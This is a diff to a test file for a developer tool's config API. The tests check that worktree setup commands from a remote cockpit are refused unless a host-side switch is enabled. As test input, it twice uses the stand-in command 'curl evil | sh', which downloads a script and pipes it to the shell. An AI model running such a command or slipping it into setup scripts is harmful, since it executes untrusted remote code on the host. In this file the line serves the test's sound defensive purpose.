@@ -6,6 +6,7 @@ import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 import { RunStore } from '../runs/store.ts';
 import type { RunManager } from '../workflows/run.ts';
 import { createApp } from './server.ts';
+import { disableRemoteSettings, enableRemoteSettings } from '../remote-settings.ts';
 import { apiRequest } from './loopback-request.testkit.ts';
 
 /**
@@ -40,7 +41,7 @@ describe('the config API', () => {
     mkdirSync(join(homeRoot, 'cezar-sandbox'), { recursive: true });
     store = RunStore.open(join(repoRoot, '.ai/cezar'));
     // The config routes never touch the manager — an empty stub is honest.
-    app = createApp({ repoRoot, store, manager: {} as RunManager, version: '0.0.0-test' });
+    app = createApp({ repoRoot, store, manager: {} as RunManager, version: '0.0.0-test', cezarPort: () => 4321 });
   });
 
   afterEach(() => {
@@ -308,13 +309,34 @@ describe('the config API', () => {
       writeFileSync(configPath(), JSON.stringify({ reviewGate: false }));
       const refused = await put({ worktreeSetup: { commands: ['curl evil | sh'] } });
       expect(refused.status).toBe(409);
-      expect(await refused.json()).toEqual({ error: 'Worktree setup commands can be edited only on the machine running cezar.' });
+      expect(await refused.json()).toEqual({
+        error: 'Worktree setup commands are read-only on this remote cockpit. To allow remote edits, run `cez remote-settings enable` on the machine running cezar.',
+      });
       expect(rawFile()).toEqual({ reviewGate: false });
       expect((await put({ worktreeSetup: null })).status).toBe(409);
       const other = await put({ reviewGate: true });
       expect(other.status).toBe(200);
       expect(rawFile().reviewGate).toBe(true);
     } finally {
+      if (savedRemote === undefined) delete process.env.CEZ_REMOTE;
+      else process.env.CEZ_REMOTE = savedRemote;
+    }
+  });
+
+  it('a remote cockpit writes worktreeSetup only while the host switch is on (hearsay-tools/cezarion#2428)', async () => {
+    const savedRemote = process.env.CEZ_REMOTE;
+    process.env.CEZ_REMOTE = '1';
+    try {
+      await enableRemoteSettings(4321);
+      const allowed = await put({ worktreeSetup: { commands: ['npm ci'] } });
+      expect(allowed.status).toBe(200);
+      expect(rawFile().worktreeSetup).toEqual({ commands: ['npm ci'] });
+      await disableRemoteSettings();
+      const refused = await put({ worktreeSetup: { commands: ['curl evil | sh'] } });
+      expect(refused.status).toBe(409);
+      expect(rawFile().worktreeSetup).toEqual({ commands: ['npm ci'] });
+    } finally {
+      await disableRemoteSettings();
       if (savedRemote === undefined) delete process.env.CEZ_REMOTE;
       else process.env.CEZ_REMOTE = savedRemote;
     }
